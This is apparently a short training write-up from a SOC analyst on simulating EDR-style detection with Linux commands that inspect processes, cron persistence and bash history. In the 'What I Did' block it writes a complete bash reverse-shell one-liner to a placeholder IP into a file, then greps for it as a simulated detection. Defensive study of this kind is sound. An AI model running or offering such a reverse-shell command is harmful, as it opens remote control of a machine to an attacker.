# 01 — EDR Basics with CrowdStrike-like Logic

---

## Scenario

This module explored how Endpoint Detection and Response (EDR) systems work — focusing on how they detect suspicious activity at the process and user level. While I didn’t use a commercial EDR like CrowdStrike, I simulated its core behaviors using Linux command-line tools to inspect running processes, cron jobs, shell history, and reverse shell signatures.

---

## What I Did

```bash
# Viewed top resource-consuming processes
ps aux --sort=-%cpu | head

# Checked for persistence mechanisms
crontab -l
ls -l /etc/cron.* /etc/init.d/ ~/.config/autostart

# Reviewed recent shell commands
cat ~/.bash_history | tail -n 20

# Simulated detection of a reverse shell pattern
echo "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" >> ~/simulated_alert.sh
grep 'bash -i' ~/simulated_alert.sh
```

---

## What I Learned

- EDR systems monitor processes and file system activity to detect indicators of compromise.
- Many malicious actions leave traces — like suspicious bash history, abnormal cron jobs, or rogue reverse shell commands.
- Even without a GUI-based platform, the logic behind EDR detection can be simulated with basic tools like `ps`, `grep`, and `awk`.
- Being able to detect abnormal patterns manually helps build intuition for what automated tools are doing under the hood.

---

## Why It Matters

As a SOC analyst, I may not always have direct access to EDR dashboards — but understanding how they work and how to recognize suspicious patterns at the endpoint level is essential. These skills are also useful for triage and confirming the validity of alerts. This module helps bridge the gap between raw system data and EDR-based detection.

---

